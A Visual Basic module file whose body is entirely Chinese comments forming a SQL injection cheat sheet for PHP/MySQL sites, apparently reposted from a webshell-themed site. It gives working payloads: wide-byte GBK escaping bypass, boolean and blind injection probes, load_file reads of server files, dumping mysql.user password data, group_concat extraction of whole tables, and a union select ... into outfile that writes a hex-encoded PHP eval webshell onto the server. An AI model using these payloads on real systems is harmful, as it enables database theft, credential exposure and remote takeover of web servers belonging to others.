Attribute VB_Name = "Module2"
Option Explicit

'注释符: # 即 % 23 、 --  、 /*
'
'magic_quotes_gpc = On           addslashes()过滤，对 ' " \ null 转义  即在前面加上反斜线
'PS: intval()         用于过滤数字类型
'register_globals = Off          关闭注册全局变量
'display_errors = Off            关闭错误提示
'
'
'GBK宽字节突破magic_quotes_gpc = On限制 用 % f5' 代替 ' 即 ' 变成 鮘' 而不是 \'
'
'
'实践发现
'假设 id 为数字型，如果sql语句为 id='$id' 即使用单引号，那提交?id=1 and 1=1 和?id=1 and 1=2 结果都是?id=1 ,即取空格前面的参数。
'此时可使用?id=1' and 1=1# 和?id=1' and 1=2# 来判断以及构造SQL语句。
'
'查看PHP代码有时若不替换一些字符如<，返回网页将无法查看代码。
'replace(load_file(HEX),char(60),char(32))
'union select 1,replace(load_file(HEX),char(60),char(32)),3
'char(60)表示 <
'char(32)表示 空格
'
'Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
'表示前后编码不一致
'unhex (Hex(参数))
'union select 1,unhex(hex(load_file(HEX))),3
'
'
'@@hostname                               DATA服务器名
'@@version_compile_os                     判断系统类型
'@@basedir                                数据库安装目录
'@@datadir                                数据库存储目录
'@@plugin_dir                             插件目录路径
'@@group_concat_max_len                   group_concat()最大长度
'user()                                   当前用户
'database()                               当前数据库
'version()                                mysql版本
'concat(字段1,0x7C,字段2,0x7C,字段N)      连接多个参数
'group_concat(字段)                       列出所有行
'
'
'load_file(16进制文件物理地址)            读取文件
'写webshell <?php @eval_r($_POST['c']);?>       PS:windows地址用 / 或者 \\ ，单独 \ 不行。
' and 1=2 union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E,3,..n into outfile '文件物理地址'
'
'
'
'select user,password,update_priv,file_priv from mysql.user          mysql.user为用户全局权限
'select * from mysql.db                                              mysql.db为用户数据库操作权限
'
'
' and (select count(*) from 表段)>0
' and (select count(字段) from 表段)>0
' and (select length(字段) from 表段 limit N,1)>5
' and (select ascii(mid(字段,N,1)) from 表段 limit N,1)>96



'php sql injector的时候，很多情况下都是显示一行一行的数据，要一次得到全部数据或者表格，那就的重复多次。
'函数group_concat可以实现将表格放入一个单元格中 (即仅有一行一列)
'例如:
'
'select group_concat(id,0x7c,name,0x7c,tel,0x5d) from g
'
'那么将得到:
'
'1|张三|83023023],|李四|13893232322],…..
'（注意上面查询结果不是一行多列，而是一行一列）
'
'假设原来的sql注入地方为:
'
'select name from userinfo where id=$id
'
'那么可以这样构造:
'id=1 and 1=2 union selelct group_concat(id,0x7c,name,0x7c,tel,0x5d) from g
'本站内容均为原创，转载请务必保留署名与链接！
'php mysql注入的一种快速有效union方法select出数据库内容:http://www.webshell.cc/3415.html

